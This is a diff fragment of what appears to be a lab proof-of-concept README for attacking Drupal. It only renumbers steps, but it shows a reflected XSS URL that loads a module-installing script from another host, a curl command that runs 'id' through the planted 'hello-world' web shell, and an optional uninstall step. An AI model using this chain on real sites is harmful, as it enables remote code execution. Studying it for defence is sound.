@@ -68,13 +68,13 @@ http://192.168.5.17/user/login
 http://192.168.5.17/test/rxss.php?q=<script src=http://192.168.5.13/installModuleDrupal.js></script>
 ```
 
-6. execute OS command
+5. execute OS command
 
 ```
 curl -s "http://192.168.5.17/hello-world?pass=test&cmd=id" | head -n 1
 ```
 
-7. [optional] uninstall module
+6. [optional] uninstall module
 
 *Drupal -> Extend -> [tab] Uninstall -> (filter by name) hello -> (mark checkbox) Hello World -> Uninstall -> Uninstall*
 
